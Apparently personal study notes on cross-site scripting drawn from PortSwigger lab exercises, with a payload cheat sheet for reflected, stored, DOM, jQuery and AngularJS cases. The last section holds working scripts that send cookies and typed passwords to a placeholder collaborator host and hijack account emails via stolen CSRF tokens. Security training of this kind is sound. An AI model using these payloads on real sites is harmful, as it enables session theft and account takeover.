>Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.

## How does XSS works?
>Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.

## What are the types of XSS attacks?
There are three main types of XSS attacks. These are:
- [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting), where the malicious script comes from the current HTTP request.
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.
- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.

## What can XSS be used for?
An attacker who exploits a cross-site scripting vulnerability is typically able to:

- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform.
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.
## Impact of XSS vulnerabilities

The actual impact of an XSS attack generally depends on the nature of the application, its functionality and data, and the status of the compromised user. For example:

- In a brochureware application, where all users are anonymous and all information is public, the impact will often be minimal.
- In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.
- If the compromised user has elevated privileges within the application, then the impact will generally be critical, allowing the attacker to take full control of the vulnerable application and compromise all users and their data.

# Testing
```js
# reflected xss
<script>alert(1)</script> 
<img src=1 onerror=alert(1)>
"onmouseover="alert(1)
</script><script>alert(1)</script>
'-alert(1)-' # use this in manual testing not in direct site, open with browser
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

# try sending test'payload after test\payload 
if backslash doesn't get escaped
\'-alert(1)//

# reflected inside a JavaScript template string.
${alert(1)}

# stored xss
1. Enter the following into the comment box:
    `<script>alert(1)</script>`
2. Enter a name, email and website.
3. Click "Post comment".
4. Go back to the blog.

# if your input is store u can check xss with this 
javascript:alert(1)
# DOM XSS in `document.write` sink using source `location.search` inside a select element
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>

# dom based xss
1. Enter a random alphanumeric string into the search box.
2. Right-click and inspect the element, and observe that your random string has been placed inside an `img src` attribute.
3. Break out of the `img` attribute by searching for:
    `"><svg onload=alert(1)>`
```
# jQuery anchor vulnerability
```js
# DOM XSS in jQuery anchor `href` attribute sink using
1. On the Submit feedback page, change the query parameter `returnPath` to `/` followed by a random alphanumeric string.
2. Right-click and inspect the element, and observe that your random string has been placed inside an a `href` attribute.
3. Change `returnPath` to:
    `javascript:alert(document.cookie)`
Hit enter and click "back".

# DOM XSS in jQuery selector sink using a hashchange event
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

```
# Angular js
```js
1. Enter a random alphanumeric string into the search box.
2. View the page source and observe that your random string is enclosed in an `ng-app` directive.
3. Enter the following AngularJS expression in the search box:
    `{{$on.constructor('alert(1)')()}}`
4. Click **search**.
   
# sandbox escape without strings
example:https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
# Reflected DOM XSS
```js
1. In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.
2. Back in the lab, go to the target website and use the search bar to search for a random test string, such as `"XSS"`.
3. Return to the Proxy tool in Burp Suite and forward the request.
4. On the Intercept tab, notice that the string is reflected in a JSON response called `search-results`.
5. From the Site Map, open the `searchResults.js` file and notice that the JSON response is used with an `eval()` function call.
6. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.
7. To solve this lab, enter the following search term:
    `\"-alert(1)}//`
```
# Stored DOM XSS
```
Post a comment containing the following vector:
`<><img src=1 onerror=alert(1)>`
```
# enumeration of reflected xss if common tags are blocked
```js
<$$> # copy all tags from cheatsheet and enmurate
# example i can use body tag and with event combine
<body%20=1>
<body%20§§=1> # copy all events from cheatsheet and enmurate

# <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
### if svg tags are allowed
```js 
<svg><animatetransform%20=1>
<svg><animatetransform%20§§=1> #enmurate all events from cheatsheet
it will become:
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

```

# Reflected XSS in canonical link tag
```js
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
To trigger the exploit on yourself, press one of the following key combinations:
- On Windows: `ALT+SHIFT+X`
```

# Exploiting cross-site scripting to steal cookies
```js
blog comment -stealing cookie
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

blog comment -stealing password 
<script>
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
</script>

blog comment -change anyone who see our comment (craft for urself)
<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() { 
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
	var changeReq = new XMLHttpRequest(); 
	changeReq.open('post', '/my-account/change-email', true);
	changeReq.send('csrf='+token+'&email=test@test.com') }; 
	</script>
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


